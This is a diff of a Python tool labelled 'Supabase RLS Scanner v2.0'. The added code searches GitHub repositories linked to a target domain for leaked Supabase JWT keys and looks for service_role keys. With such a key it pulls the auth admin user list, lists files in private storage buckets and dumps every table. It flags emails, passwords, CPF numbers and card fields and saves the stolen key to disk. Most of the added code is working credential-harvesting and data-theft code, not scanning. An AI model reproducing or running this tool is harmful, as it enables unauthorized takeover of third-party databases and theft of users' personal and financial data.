@@ -1,17 +1,20 @@
 #!/usr/bin/env python3
+"""
+Supabase RLS Scanner v2.0
+Security scanner for Supabase Row Level Security misconfigurations
+"""
 
 import requests
 import json
 import re
 import os
 import sys
-import csv
+import base64
 from datetime import datetime
 from urllib.parse import urlparse, quote
-from typing import Optional, Dict, List
+from typing import Optional, Dict, List, Any
 
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", None)
-
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
 
 class Colors:
     RED = '\033[91m'
@@ -35,7 +38,7 @@ def print_banner():
  |____/ \\__,_| .__/ \\__,_|_.__/ \\__,_|___/\\___|____/ \\___\\__,_|_| |_|_| |_|\\___|_|
              |_|
 {Colors.END}
-{Colors.YELLOW}    [ Supabase RLS Security Scanner ]{Colors.END}
+{Colors.YELLOW}    [ Supabase RLS Security Scanner v2.0 ]{Colors.END}
 """
     print(banner)
 
@@ -52,7 +55,31 @@ def print_status(msg: str, status: str = "info"):
     print(f"{icons.get(status, icons['info'])} {msg}")
 
 
+def decode_jwt_role(jwt_token: str) -> Optional[str]:
+    """Decode JWT and return the role (anon or service_role)"""
+    try:
+        payload = jwt_token.split('.')[1]
+        payload += '=' * (4 - len(payload) % 4)
+        decoded = base64.b64decode(payload).decode('utf-8')
+        data = json.loads(decoded)
+        return data.get('role', 'unknown')
+    except:
+        return None
+
+
+def _get_github_headers() -> Dict[str, str]:
+    """Get GitHub API headers"""
+    headers = {
+        "Accept": "application/vnd.github.v3+json",
+        "User-Agent": "SupabaseScanner/2.0"
+    }
+    if GITHUB_TOKEN:
+        headers["Authorization"] = f"token {GITHUB_TOKEN}"
+    return headers
+
+
 def search_github_for_supabase(domain: str) -> Optional[Dict[str, str]]:
+    """Search for Supabase credentials on GitHub based on domain"""
     print_status(f"Searching GitHub for: {domain}", "info")
 
     parsed = urlparse(domain if domain.startswith("http") else f"https://{domain}")
@@ -65,28 +92,130 @@ def search_github_for_supabase(domain: str) -> Optional[Dict[str, str]]:
         search_terms.append(".".join(parts[:-1]))
     search_terms.append(hostname)
 
-    headers = {
-        "Accept": "application/vnd.github.v3+json",
-        "User-Agent": "SupabaseScanner/1.0"
-    }
+    headers = _get_github_headers()
+    domain_name = search_terms[0].lower()
+    found_results = []
 
-    if GITHUB_TOKEN:
-        headers["Authorization"] = f"token {GITHUB_TOKEN}"
+    print_status("Phase 1: Searching original repositories...", "info")
+    try:
+        base_name = search_terms[0]
+        repo_queries = [
+            base_name,
+            base_name.replace("medico", "-medico"),
+            base_name.replace("medico", " medico"),
+            re.sub(r'(app|web|api|admin|dashboard|portal|sistema|loja|store)', r'-\1', base_name),
+        ]
+
+        all_repos = {}
+        for repo_query in repo_queries:
+            repo_url = f"https://api.github.com/search/repositories?q={quote(repo_query)}&sort=stars&order=desc&per_page=10"
+            r = requests.get(repo_url, headers=headers, timeout=15)
+
+            if r.status_code == 200:
+                for repo_data in r.json().get("items", []):
+                    repo_name = repo_data.get("full_name", "")
+                    if repo_name not in all_repos:
+                        all_repos[repo_name] = repo_data
+
+        relevant_repos = []
+        for repo_data in all_repos.values():
+            repo = repo_data.get("full_name", "")
+            repo_lower = repo.lower()
+
+            if domain_name.replace("-", "") in repo_lower.replace("-", ""):
+                score = 0
+                if not repo_data.get("fork", False):
+                    score += 50
+                score += min(repo_data.get("stargazers_count", 0), 20)
+                pushed_at = repo_data.get("pushed_at", "")
+                if pushed_at and "2026" in pushed_at:
+                    score += 10
+                elif pushed_at and "2025" in pushed_at:
+                    score += 5
+                if repo_data.get("description"):
+                    score += 5
+                if repo_data.get("homepage"):
+                    score += 10
+
+                relevant_repos.append({
+                    "full_name": repo,
+                    "score": score,
+                    "fork": repo_data.get("fork", False),
+                    "stars": repo_data.get("stargazers_count", 0)
+                })
+
+        relevant_repos.sort(key=lambda x: x["score"], reverse=True)
+
+        for repo_info in relevant_repos:
+            repo = repo_info["full_name"]
+            fork_str = " (fork)" if repo_info["fork"] else ""
+            print_status(f"Repo: {repo} [score: {repo_info['score']}{fork_str}]", "info")
+
+            files_to_check = [
+                "scripts/seed.js", "scripts/migrate.js", "scripts/setup.js",
+                "database/seed.js", "database/migrate.js",
+                ".env.example", ".env.local.example",
+                "src/lib/supabase.ts", "lib/supabase.ts", "utils/supabase.ts",
+                "src/lib/supabase.js", "lib/supabase.js", "utils/supabase.js",
+            ]
+
+            for file_path in files_to_check:
+                try:
+                    content_url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
+                    cr = requests.get(content_url, headers={**headers, "Accept": "application/vnd.github.v3.raw"}, timeout=10)
+
+                    if cr.status_code == 200:
+                        content = cr.text
+                        url_match = re.search(r'https://([a-z0-9]+)\.supabase\.co', content)
+                        key_match = re.search(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', content)
+
+                        if url_match and key_match:
+                            project_ref = url_match.group(1)
+                            if project_ref in ["app", "your-project", "yourproject", "example", "xxx"]:
+                                continue
+
+                            key = key_match.group(1)
+                            role = decode_jwt_role(key)
+                            relevance = 20 if role == "service_role" else 10
+
+                            found_results.append({
+                                "url": f"https://{project_ref}.supabase.co",
+                                "key": key,
+                                "source": f"github:{repo}/{file_path}",
+                                "relevance": relevance
+                            })
+                            print_status(f"Found in {repo}/{file_path} (role: {role})!", "found")
+
+                            if role == "service_role":
+                                return found_results[0]
+                except:
+                    continue
+
+            if found_results:
+                break
+
+    except Exception as e:
+        print_status(f"Repo search error: {e}", "warning")
+
+    if found_results:
+        best = max(found_results, key=lambda x: x["relevance"])
+        print_status(f"Found in: {best['source']}", "found")
+        return best
+
+    print_status("Phase 2: Code search fallback...", "info")
 
     queries = [
         f'repo:{search_terms[0]} supabase.co eyJhbGci',
-        f'org:{search_terms[0]} supabase.co eyJhbGci',
         f'"{hostname}" supabase.co eyJhbGci',
         f'"{search_terms[0]}" SUPABASE_URL eyJhbGci extension:ts',
-        f'"{search_terms[0]}" SUPABASE_URL eyJhbGci extension:js',
-        f'"{search_terms[0]}" supabaseUrl eyJhbGci',
+        f'"{search_terms[0]}" supabase extension:env',
     ]
 
     found_results = []
 
     for query in queries:
         try:
-            url = f"https://api.github.com/search/code?q={quote(query)}&per_page=5"
+            url = f"https://api.github.com/search/code?q={quote(query)}&per_page=10"
             r = requests.get(url, headers=headers, timeout=15)
 
             if r.status_code == 200:
@@ -95,42 +224,36 @@ def search_github_for_supabase(domain: str) -> Optional[Dict[str, str]]:
                 for item in results:
                     repo = item.get("repository", {}).get("full_name", "")
                     file_path = item.get("path", "")
-
                     repo_lower = repo.lower()
-                    domain_name = search_terms[0].lower()
 
-                    relevance = 0
+                    relevance = 1
                     if domain_name in repo_lower:
                         relevance = 10
                     elif any(term.lower() in repo_lower for term in search_terms):
                         relevance = 5
 
-                    if relevance > 0:
-                        print_status(f"Checking: {repo}/{file_path} (relevance: {relevance})", "info")
+                    try:
+                        content_url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
+                        cr = requests.get(content_url, headers={**headers, "Accept": "application/vnd.github.v3.raw"}, timeout=10)
 
-                        try:
-                            content_url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
-                            cr = requests.get(content_url, headers={**headers, "Accept": "application/vnd.github.v3.raw"}, timeout=10)
+                        if cr.status_code == 200:
+                            content = cr.text
+                            url_match = re.search(r'https://([a-z0-9]+)\.supabase\.co', content)
+                            key_match = re.search(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', content)
 
-                            if cr.status_code == 200:
-                                content = cr.text
+                            if url_match and key_match:
+                                project_ref = url_match.group(1)
+                                if project_ref in ["app", "your-project", "yourproject", "example", "xxx", "your_project_ref"]:
+                                    continue
 
-                                url_match = re.search(r'https://([a-z0-9]+)\.supabase\.co', content)
-                                key_match = re.search(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', content)
-
-                                if url_match and key_match:
-                                    supabase_url = f"https://{url_match.group(1)}.supabase.co"
-                                    anon_key = key_match.group(1)
-
-                                    found_results.append({
-                                        "url": supabase_url,
-                                        "key": anon_key,
-                                        "source": f"github:{repo}/{file_path}",
-                                        "relevance": relevance
-                                    })
-
-                        except:
-                            continue
+                                found_results.append({
+                                    "url": f"https://{project_ref}.supabase.co",
+                                    "key": key_match.group(1),
+                                    "source": f"github:{repo}/{file_path}",
+                                    "relevance": relevance
+                                })
+                    except:
+                        continue
 
             elif r.status_code == 403:
                 print_status("GitHub rate limit reached", "warning")
@@ -142,23 +265,16 @@ def search_github_for_supabase(domain: str) -> Optional[Dict[str, str]]:
     if found_results:
         best = max(found_results, key=lambda x: x["relevance"])
         print_status(f"Found in: {best['source']}", "found")
-        print_status(f"URL: {best['url']}", "success")
-        print_status(f"Key: {best['key'][:50]}...", "success")
         return best
 
     return None
 
 
 def search_github_by_project_ref(project_ref: str) -> Optional[Dict[str, str]]:
+    """Search for anon key on GitHub by Supabase project reference"""
     print_status(f"Searching key for project ref: {project_ref}", "info")
 
-    headers = {
-        "Accept": "application/vnd.github.v3+json",
-        "User-Agent": "SupabaseScanner/1.0"
-    }
-
-    if GITHUB_TOKEN:
-        headers["Authorization"] = f"token {GITHUB_TOKEN}"
+    headers = _get_github_headers()
 
     queries = [
         f'{project_ref}.supabase.co eyJhbGci',
@@ -184,24 +300,56 @@ def search_github_by_project_ref(project_ref: str) -> Optional[Dict[str, str]]:
 
                         if cr.status_code == 200:
                             content = cr.text
-
                             if project_ref in content:
                                 key_match = re.search(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', content)
-
                                 if key_match:
-                                    anon_key = key_match.group(1)
                                     print_status(f"Key found in: {repo}/{file_path}", "found")
-                                    return {"key": anon_key, "source": f"github:{repo}/{file_path}"}
+                                    return {"key": key_match.group(1), "source": f"github:{repo}/{file_path}"}
                     except:
                         continue
-
         except:
             continue
 
     return None
 
 
+def search_service_role_key(repo: str) -> Optional[str]:
+    """Search for service_role key in a specific repository"""
+    headers = _get_github_headers()
+
+    try:
+        r = requests.get(f"https://api.github.com/repos/{repo}/git/trees/main?recursive=1", headers=headers, timeout=15)
+        if r.status_code != 200:
+            r = requests.get(f"https://api.github.com/repos/{repo}/git/trees/master?recursive=1", headers=headers, timeout=15)
+
+        if r.status_code == 200:
+            tree = r.json().get("tree", [])
+            for item in tree:
+                if item["type"] == "blob":
+                    path = item["path"]
+                    if any(x in path.lower() for x in ['.env', 'config', 'supabase', 'seed', 'script', 'migrate', 'setup', 'database']):
+                        try:
+                            content_url = f"https://api.github.com/repos/{repo}/contents/{path}"
+                            cr = requests.get(content_url, headers={**headers, "Accept": "application/vnd.github.v3.raw"}, timeout=10)
+
+                            if cr.status_code == 200:
+                                content = cr.text
+                                keys = re.findall(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', content)
+
+                                for key in keys:
+                                    role = decode_jwt_role(key)
+                                    if role == 'service_role':
+                                        return key
+                        except:
+                            continue
+    except:
+        pass
+
+    return None
+
+
 def extract_supabase_from_url(url: str) -> Optional[Dict[str, str]]:
+    """Try to extract Supabase credentials from a website URL"""
     print_status(f"Analyzing {url}...", "info")
 
     try:
@@ -279,7 +427,60 @@ def extract_supabase_from_url(url: str) -> Optional[Dict[str, str]]:
         return None
 
 
+def search_repo_for_supabase(repo: str) -> Optional[Dict[str, str]]:
+    """Search for Supabase credentials in a specific repository"""
+    print_status(f"Searching credentials in {repo}...", "info")
+
+    headers = _get_github_headers()
+
+    files_to_check = [
+        ".env.example", ".env.local.example", "env.example",
+        "src/lib/supabase.ts", "lib/supabase.ts", "utils/supabase.ts",
+        "src/lib/supabase.js", "lib/supabase.js", "utils/supabase.js",
+        "supabase/config.ts", "config/supabase.ts", "src/supabase.ts",
+        "scripts/seed.js", "scripts/migrate.js", "scripts/setup.js",
+        "database/seed.js", "database/migrate.js",
+        "supabase.ts", "supabase.js", "config.ts", "config.js"
+    ]
+
+    for file_path in files_to_check:
+        try:
+            content_url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
+            r = requests.get(content_url, headers={**headers, "Accept": "application/vnd.github.v3.raw"}, timeout=10)
+
+            if r.status_code == 200:
+                content = r.text
+
+                url_match = re.search(r'https://([a-z0-9]+)\.supabase\.co', content)
+                key_match = re.search(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', content)
+
+                if url_match and key_match:
+                    project_ref = url_match.group(1)
+                    if project_ref in ["app", "your-project", "yourproject", "example", "xxx", "your_project_ref"]:
+                        continue
+
+                    supabase_url = f"https://{project_ref}.supabase.co"
+                    key = key_match.group(1)
+                    role = decode_jwt_role(key)
+
+                    print_status(f"Found in {file_path}!", "found")
+                    print_status(f"URL: {supabase_url}", "success")
+                    print_status(f"Key type: {role}", "success" if role == "service_role" else "info")
+
+                    return {
+                        "url": supabase_url,
+                        "key": key,
+                        "source": f"github:{repo}/{file_path}",
+                        "role": role
+                    }
+        except:
+            continue
+
+    return None
+
+
 def get_target_input() -> Dict[str, str]:
+    """Get target from user"""
     print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
     print(f"{Colors.BOLD}TARGET CONFIGURATION{Colors.END}")
     print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")
@@ -288,8 +489,9 @@ def get_target_input() -> Dict[str, str]:
     print("  1. Website URL (e.g., https://example.com)")
     print("  2. Direct Supabase URL (e.g., https://abc123.supabase.co)")
     print("  3. Project Reference (e.g., abc123xyz)")
+    print("  4. GitHub Repository (e.g., user/repo)")
     print()
-    print(f"{Colors.CYAN}The scanner will try to extract the Anon Key automatically from the site and GitHub.{Colors.END}")
+    print(f"{Colors.CYAN}The scanner will try to extract the Anon Key automatically.{Colors.END}")
     print()
 
     target = input(f"{Colors.YELLOW}Target: {Colors.END}").strip()
@@ -300,7 +502,19 @@ def get_target_input() -> Dict[str, str]:
 
     result = {"url": None, "key": None, "source": None}
 
-    if ".supabase.co" in target:
+    if "/" in target and not target.startswith("http") and "." not in target.split("/")[0]:
+        print_status(f"GitHub repository detected: {target}", "info")
+        github_result = search_repo_for_supabase(target)
+
+        if github_result:
+            result["url"] = github_result["url"]
+            result["key"] = github_result["key"]
+            result["source"] = github_result.get("source")
+        else:
+            print_status("Could not find credentials in repository", "error")
+            sys.exit(1)
+
+    elif ".supabase.co" in target:
         if not target.startswith("https://"):
             target = f"https://{target}"
         result["url"] = target
@@ -308,7 +522,7 @@ def get_target_input() -> Dict[str, str]:
 
         project_ref = target.split("//")[1].split(".")[0]
         print()
-        print_status("Searching Anon Key on GitHub...", "info")
+        print_status("Searching for Anon Key on GitHub...", "info")
         github_result = search_github_by_project_ref(project_ref)
         if github_result:
             result["key"] = github_result["key"]
@@ -320,7 +534,7 @@ def get_target_input() -> Dict[str, str]:
             target = f"https://{target}"
         print_status(f"Detected as website URL: {target}", "info")
         print()
-        print_status("Step 1: Analyzing website source code...", "info")
+        print_status("Phase 1: Analyzing website source code...", "info")
         extracted = extract_supabase_from_url(target)
 
         if extracted:
@@ -328,12 +542,12 @@ def get_target_input() -> Dict[str, str]:
             result["key"] = extracted["key"]
             print_status(f"Supabase URL extracted: {result['url']}", "success")
             if result["key"]:
-                print_status("Anon key extracted from site!", "success")
+                print_status("Anon key extracted from website!", "success")
                 result["source"] = "website"
 
         if not result["url"] or not result["key"]:
             print()
-            print_status("Step 2: Searching on GitHub...", "info")
+            print_status("Phase 2: Searching on GitHub...", "info")
             github_result = search_github_for_supabase(target)
 
             if github_result:
@@ -357,10 +571,10 @@ def get_target_input() -> Dict[str, str]:
 
     else:
         result["url"] = f"https://{target}.supabase.co"
-        print_status(f"URL built: {result['url']}", "info")
+        print_status(f"URL constructed: {result['url']}", "info")
 
         print()
-        print_status("Searching Anon Key on GitHub...", "info")
+        print_status("Searching for Anon Key on GitHub...", "info")
         github_result = search_github_by_project_ref(target)
         if github_result:
             result["key"] = github_result["key"]
@@ -371,9 +585,9 @@ def get_target_input() -> Dict[str, str]:
         print()
         print_status("Anon Key not found automatically", "warning")
         print(f"\n{Colors.CYAN}Where to find the Anon Key:{Colors.END}")
-        print("  - DevTools (F12) > Network > filter 'supabase' > check header 'apikey'")
+        print("  - DevTools (F12) > Network > filter 'supabase' > see 'apikey' header")
         print("  - View Source (Ctrl+U) > search 'eyJhbGci' or 'SUPABASE'")
-        print("  - Project's GitHub > files .env, config.ts, supabase.ts")
+        print("  - Project GitHub > .env, config.ts, supabase.ts files")
         print()
         anon_key = input(f"{Colors.YELLOW}Anon Key (JWT): {Colors.END}").strip()
         if not anon_key:
@@ -406,6 +620,9 @@ class SupabaseScanner:
         self.rls_status = "unknown"
         self.write_access = False
         self.dump_dir = None
+        self.source_repo = None
+        self.service_role_key = None
+        self.escalation_results = None
 
         self.common_tables = [
             "users", "profiles", "accounts", "auth_users", "members", "customers",
@@ -427,6 +644,7 @@ class SupabaseScanner:
         ]
 
     def check_connection(self) -> bool:
+        """Check if the instance is online"""
         try:
             r = requests.get(f"{self.url}/rest/v1/", headers=self.headers, timeout=10)
             if r.status_code in [200, 401, 406]:
@@ -443,6 +661,7 @@ class SupabaseScanner:
             return False
 
     def enumerate_tables(self) -> List[Dict]:
+        """Enumerate all accessible tables"""
         print_status("Enumerating tables...", "info")
 
         found = []
@@ -486,6 +705,7 @@ class SupabaseScanner:
         return found
 
     def test_write_access(self) -> Dict[str, bool]:
+        """Test for write access (INSERT/UPDATE/DELETE)"""
         print_status("Testing write access...", "info")
 
         results = {"insert": False, "update": False, "delete": False}
@@ -550,6 +770,7 @@ class SupabaseScanner:
         return results
 
     def check_storage_buckets(self) -> List[Dict]:
+        """Check storage buckets"""
         print_status("Checking storage buckets...", "info")
 
         try:
@@ -572,6 +793,7 @@ class SupabaseScanner:
             return []
 
     def check_rpc_functions(self) -> List[str]:
+        """Try to discover RPC functions"""
         print_status("Checking RPC functions...", "info")
 
         common_rpcs = [
@@ -597,7 +819,280 @@ class SupabaseScanner:
 
         return found
 
+    def hunt_service_role_key(self) -> Optional[str]:
+        """Search for service_role key in source repository"""
+        if not self.source_repo:
+            return None
+
+        repo = self.source_repo.replace("github:", "").split("/")
+        if len(repo) >= 2:
+            repo_full = "/".join(repo[:2])
+            print_status(f"Searching service_role key in {repo_full}...", "info")
+
+            key = search_service_role_key(repo_full)
+            if key:
+                self.service_role_key = key
+                print_status("SERVICE_ROLE KEY FOUND!", "critical")
+                return key
+
+        return None
+
+    def escalate_with_service_role(self) -> Dict[str, Any]:
+        """Execute escalation using service_role key"""
+        if not self.service_role_key:
+            return {"success": False, "error": "No service_role key available"}
+
+        print()
+        print(f"{Colors.RED}{'='*60}{Colors.END}")
+        print(f"{Colors.RED}{Colors.BOLD}ESCALATION WITH SERVICE_ROLE KEY{Colors.END}")
+        print(f"{Colors.RED}{'='*60}{Colors.END}")
+        print()
+
+        headers = {
+            "apikey": self.service_role_key,
+            "Authorization": f"Bearer {self.service_role_key}",
+            "Content-Type": "application/json"
+        }
+
+        results = {
+            "success": True,
+            "auth_users": [],
+            "all_tables": [],
+            "auth_settings": None,
+            "storage_objects": {}
+        }
+
+        print_status("Accessing Auth Admin API...", "info")
+        try:
+            r = requests.get(
+                f"{self.url}/auth/v1/admin/users?page=1&per_page=100",
+                headers=headers,
+                timeout=15
+            )
+            if r.status_code == 200:
+                data = r.json()
+                users = data.get("users", [])
+                results["auth_users"] = users
+                print_status(f"AUTH.USERS: {len(users)} users found!", "critical")
+
+                for u in users[:5]:
+                    email = u.get('email', 'N/A')
+                    uid = u.get('id', 'N/A')[:8]
+                    created = u.get('created_at', '')[:10]
+                    print(f"      {Colors.RED}- {email} | {uid}... | {created}{Colors.END}")
+
+                if len(users) > 5:
+                    print(f"      ... +{len(users)-5} more users")
+            else:
+                print_status(f"Auth Admin: {r.status_code}", "warning")
+        except Exception as e:
+            print_status(f"Auth Admin error: {e}", "error")
+
+        print()
+        print_status("Enumerating all tables (RLS bypass)...", "info")
+        try:
+            r = requests.get(f"{self.url}/rest/v1/", headers=headers, timeout=15)
+            if r.status_code == 200:
+                spec = r.json()
+                if "paths" in spec:
+                    tables = [p.replace("/", "") for p in spec["paths"].keys() if p != "/"]
+                    results["all_tables"] = tables
+                    print_status(f"TOTAL: {len(tables)} tables exposed!", "critical")
+
+                    for t in tables[:20]:
+                        print(f"      - {t}")
+                    if len(tables) > 20:
+                        print(f"      ... +{len(tables)-20} more tables")
+        except Exception as e:
+            print_status(f"Table enum error: {e}", "error")
+
+        print()
+        print_status("Accessing Auth Settings...", "info")
+        try:
+            r = requests.get(f"{self.url}/auth/v1/settings", headers=headers, timeout=15)
+            if r.status_code == 200:
+                results["auth_settings"] = r.json()
+                print_status("Auth Settings accessible!", "found")
+        except:
+            pass
+
+        print()
+        print_status("Accessing private Storage...", "info")
+        try:
+            r = requests.get(f"{self.url}/storage/v1/bucket", headers=headers, timeout=15)
+            if r.status_code == 200:
+                buckets = r.json()
+                for bucket in buckets:
+                    bucket_name = bucket.get("name")
+                    is_public = bucket.get("public", False)
+
+                    try:
+                        obj_r = requests.post(
+                            f"{self.url}/storage/v1/object/list/{bucket_name}",
+                            headers=headers,
+                            json={"prefix": "", "limit": 50},
+                            timeout=15
+                        )
+                        if obj_r.status_code == 200:
+                            objects = obj_r.json()
+                            results["storage_objects"][bucket_name] = {
+                                "public": is_public,
+                                "objects": objects
+                            }
+
+                            status = f"{Colors.GREEN}PUBLIC{Colors.END}" if is_public else f"{Colors.RED}PRIVATE{Colors.END}"
+                            print_status(f"Bucket '{bucket_name}' ({status}): {len(objects)} objects", "found")
+
+                            for obj in objects[:5]:
+                                if isinstance(obj, dict):
+                                    print(f"        - {obj.get('name', 'N/A')}")
+                            if len(objects) > 5:
+                                print(f"        ... +{len(objects)-5} more")
+                    except:
+                        pass
+        except Exception as e:
+            print_status(f"Storage error: {e}", "error")
+
+        print()
+        print_status("Dumping ALL tables (with service_role)...", "info")
+
+        tables_to_dump = results.get("all_tables", [])
+        if not tables_to_dump:
+            tables_to_dump = ["users", "auth_users", "profiles", "customers", "payments",
+                              "transactions", "api_keys", "secrets", "credentials", "tokens",
+                              "subscriptions", "orders", "invoices"]
+            print_status(f"Using fallback list ({len(tables_to_dump)} tables)", "warning")
+        else:
+            print_status(f"Dumping ALL {len(tables_to_dump)} tables...", "critical")
+
+        all_tables_data = {}
+        total_rows = 0
+        for i, table in enumerate(tables_to_dump):
+            try:
+                count_headers = {**headers, "Prefer": "count=exact"}
+                r = requests.get(
+                    f"{self.url}/rest/v1/{table}?select=*&limit=500",
+                    headers=count_headers,
+                    timeout=15
+                )
+                if r.status_code == 200:
+                    data = r.json()
+                    if data:
+                        content_range = r.headers.get("content-range", "")
+                        if "/" in content_range:
+                            total_in_table = content_range.split("/")[-1]
+                        else:
+                            total_in_table = len(data)
+
+                        all_tables_data[table] = {
+                            "data": data,
+                            "total": total_in_table,
+                            "columns": list(data[0].keys()) if data else []
+                        }
+                        total_rows += len(data)
+
+                        sensitive_keywords = ['email', 'phone', 'password', 'key', 'token', 'secret', 'cpf', 'cnpj', 'card', 'payment', 'credit']
+                        is_sensitive = any(kw in table.lower() for kw in sensitive_keywords)
+
+                        if i % 10 == 0 or is_sensitive or len(data) > 100:
+                            status = "critical" if is_sensitive else "found"
+                            print_status(f"[{i+1}/{len(tables_to_dump)}] {table}: {len(data)}/{total_in_table} records", status)
+
+                        for row in data[:1]:
+                            sens_fields = {}
+                            for k, v in row.items():
+                                if any(x in k.lower() for x in sensitive_keywords):
+                                    sens_fields[k] = str(v)[:50] if v else None
+                            if sens_fields:
+                                print(f"        {Colors.RED}SENSITIVE: {sens_fields}{Colors.END}")
+            except:
+                pass
+
+        print()
+        print_status(f"TOTAL: {len(all_tables_data)} tables with data, {total_rows} records", "critical")
+        results["all_tables_data"] = all_tables_data
+        results["total_rows_dumped"] = total_rows
+
+        self.escalation_results = results
+        return results
+
+    def dump_escalation_data(self, output_dir: str = None) -> str:
+        """Save escalation data"""
+        if not self.escalation_results:
+            return None
+
+        if not output_dir:
+            output_dir = self.dump_dir
+
+        if not output_dir:
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            dump_base = os.path.join(script_dir, "dump")
+            os.makedirs(dump_base, exist_ok=True)
+
+            if self.source_repo:
+                repo_name = self.source_repo.split("/")[-1] if "/" in self.source_repo else self.source_repo
+                safe_name = "".join(c if c.isalnum() or c in "_-" else "_" for c in repo_name)
+            else:
+                project_ref = self.url.split("//")[1].split(".")[0]
+                safe_name = project_ref[:8]
+
+            timestamp = datetime.now().strftime("%m%d_%H%M")
+            output_dir = os.path.join(dump_base, f"{safe_name}_{timestamp}")
+
+        os.makedirs(output_dir, exist_ok=True)
+
+        if self.escalation_results.get("auth_users"):
+            with open(f"{output_dir}/auth_users.json", "w", encoding="utf-8") as f:
+                json.dump(self.escalation_results["auth_users"], f, indent=2, default=str, ensure_ascii=False)
+            print_status(f"auth_users.json saved ({len(self.escalation_results['auth_users'])} users)", "success")
+
+        if self.escalation_results.get("all_tables"):
+            with open(f"{output_dir}/all_tables.txt", "w", encoding="utf-8") as f:
+                f.write("\n".join(self.escalation_results["all_tables"]))
+            print_status(f"all_tables.txt saved ({len(self.escalation_results['all_tables'])} tables)", "success")
+
+        if self.escalation_results.get("auth_settings"):
+            with open(f"{output_dir}/auth_settings.json", "w", encoding="utf-8") as f:
+                json.dump(self.escalation_results["auth_settings"], f, indent=2, default=str)
+            print_status("auth_settings.json saved", "success")
+
+        if self.escalation_results.get("storage_objects"):
+            with open(f"{output_dir}/storage_objects.json", "w", encoding="utf-8") as f:
+                json.dump(self.escalation_results["storage_objects"], f, indent=2, default=str)
+            print_status("storage_objects.json saved", "success")
+
+        if self.escalation_results.get("all_tables_data"):
+            tables_dir = os.path.join(output_dir, "tables")
+            os.makedirs(tables_dir, exist_ok=True)
+
+            for table, table_info in self.escalation_results["all_tables_data"].items():
+                data = table_info.get("data", [])
+                if data:
+                    safe_name = "".join(c if c.isalnum() or c in "_-" else "_" for c in table)
+                    with open(f"{tables_dir}/{safe_name}.json", "w", encoding="utf-8") as f:
+                        json.dump({
+                            "table": table,
+                            "total_in_db": table_info.get("total"),
+                            "dumped": len(data),
+                            "columns": table_info.get("columns", []),
+                            "data": data
+                        }, f, indent=2, default=str, ensure_ascii=False)
+
+            total_rows = self.escalation_results.get("total_rows_dumped", 0)
+            print_status(f"ALL tables saved to /tables/ ({len(self.escalation_results['all_tables_data'])} tables, {total_rows} records)", "critical")
+
+        if self.service_role_key:
+            with open(f"{output_dir}/SERVICE_ROLE_KEY.txt", "w") as f:
+                f.write(f"# SERVICE ROLE KEY - FULL ADMIN ACCESS\n")
+                f.write(f"# URL: {self.url}\n")
+                f.write(f"# Source: {self.source_repo}\n\n")
+                f.write(self.service_role_key)
+            print_status("SERVICE_ROLE_KEY.txt saved", "critical")
+
+        return output_dir
+
     def determine_rls_status(self) -> str:
+        """Determine RLS status"""
         if not self.tables_found:
             self.rls_status = "enabled"
             return "enabled"
@@ -619,6 +1114,7 @@ class SupabaseScanner:
         return "partial"
 
     def dump_table(self, table: str, limit: int = 1000) -> List[Dict]:
+        """Dump a table"""
         try:
             r = requests.get(
                 f"{self.url}/rest/v1/{table}?select=*&limit={limit}",
@@ -632,10 +1128,21 @@ class SupabaseScanner:
             return []
 
     def dump_all_tables(self, output_dir: str = None) -> str:
+        """Dump all found tables"""
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        dump_base = os.path.join(script_dir, "dump")
+        os.makedirs(dump_base, exist_ok=True)
+
         if not output_dir:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            project_ref = self.url.split("//")[1].split(".")[0]
-            output_dir = f"supabase_dump_{project_ref}_{timestamp}"
+            if self.source_repo:
+                repo_name = self.source_repo.split("/")[-1] if "/" in self.source_repo else self.source_repo
+                safe_name = "".join(c if c.isalnum() or c in "_-" else "_" for c in repo_name)
+            else:
+                project_ref = self.url.split("//")[1].split(".")[0]
+                safe_name = project_ref[:8]
+
+            timestamp = datetime.now().strftime("%m%d_%H%M")
+            output_dir = os.path.join(dump_base, f"{safe_name}_{timestamp}")
 
         os.makedirs(output_dir, exist_ok=True)
         self.dump_dir = output_dir
@@ -661,6 +1168,7 @@ class SupabaseScanner:
                     json.dump(data, f, indent=2, default=str, ensure_ascii=False)
 
                 if data and isinstance(data[0], dict):
+                    import csv
                     with open(f"{output_dir}/{table}.csv", "w", newline="", encoding="utf-8") as f:
                         writer = csv.DictWriter(f, fieldnames=data[0].keys())
                         writer.writeheader()
@@ -680,6 +1188,7 @@ class SupabaseScanner:
         return output_dir
 
     def generate_report(self) -> str:
+        """Generate complete report"""
         report = []
         report.append("\n" + "="*70)
         report.append(f"{Colors.BOLD}SUPABASE ANALYSIS REPORT{Colors.END}")
@@ -696,7 +1205,7 @@ class SupabaseScanner:
             report.append(f"\n{Colors.RED}{Colors.BOLD}[CRITICAL] RLS DISABLED!{Colors.END}")
             report.append(f"{Colors.RED}Full read/write access available{Colors.END}")
         elif self.rls_status == "partial":
-            report.append(f"\n{Colors.YELLOW}{Colors.BOLD}[WARNING] RLS PARTIALLY CONFIGURED{Colors.END}")
+            report.append(f"\n{Colors.YELLOW}{Colors.BOLD}[ALERT] RLS PARTIALLY CONFIGURED{Colors.END}")
             report.append(f"{Colors.YELLOW}Some tables are exposed{Colors.END}")
         else:
